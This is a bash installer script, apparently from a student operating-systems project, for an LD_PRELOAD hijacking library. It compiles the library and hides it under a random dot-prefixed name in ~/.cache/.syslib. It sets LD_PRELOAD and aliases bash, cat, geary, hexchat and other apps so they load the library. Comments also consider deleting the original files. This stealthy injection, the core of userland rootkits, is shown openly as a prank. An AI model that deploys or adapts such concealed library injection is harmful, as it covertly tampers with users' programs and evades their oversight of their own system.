#!/bin/bash

# find the files
SOURCE_SO=$(find ~/ -name combinedMRWOCG.so | grep -m 1 "combinedMRWOCG.so") 
SOURCE_C=$(find ~/ -name combinedMRWOCG.c | grep -m 1 "combinedMRWOCG.c") 

echo "$SOURCE_C " 
echo "$SOURCE_SO" 

# Compile the .so from the .c file
gcc -shared -fPIC -o "$SOURCE_SO" "$SOURCE_C" -ldl

# IMPORTANT NOTE: make sure you have your own paths to the code here!!!
#SOURCE_SO="$HOME/Documents/OS_Project/osProject/main/src/test/combinedMRWOCG.so"
HIDDEN_DIR="$HOME/.cache/.syslib"
NEW_NAME=".lib$(head /dev/urandom | tr -dc a-z0-9 | head -c 8).so"
HIDDEN_SO="$HIDDEN_DIR/$NEW_NAME"

echo "[*] Starting installation..."
sleep 1
echo "Have fun copying my homework!"
sleep 1

# Check if source exists
if [ ! -f "$SOURCE_SO" ]; then
    echo "[✗] Error: Source .so file not found at: $SOURCE_SO"
    exit 1
fi

# Create hidden directory
mkdir -p "$HIDDEN_DIR"

# Copy and rename the .so file
cp "$SOURCE_SO" "$HIDDEN_SO"
chmod 755 "$HIDDEN_SO"


# Optionally delete the original
#rm -f "$SOURCE_SO"
# maybe also add to remove the original .c file? 

# Export LD_PRELOAD in the current shell session
#export LD_PRELOAD=./"$HIDDEN_SO"

# Export LD_PRELOAD only in this session
export LD_PRELOAD="$HIDDEN_SO"

# Create a working alias for geary with DISABLE_WRITE_PRANK (doesnt work with geary anymore, have to fix:TODO)
alias geary="DISABLE_WRITE_PRANK=1 LD_PRELOAD=$HIDDEN_SO geary"
# Optional: add more aliases
declare -a apps=("bash" "cat" "hexchat" "liferea" "gnome-weather" "geary")
for app in "${apps[@]}"; do
    alias $app="DISABLE_GETCHAR_PRANK=1 LD_PRELOAD=$HIDDEN_SO $app"
done

echo "[✓] Install complete."
echo "[!] Type 'geary' in this terminal to run it with hijack active."
echo "[i] To clean up, just delete: $HIDDEN_SO"
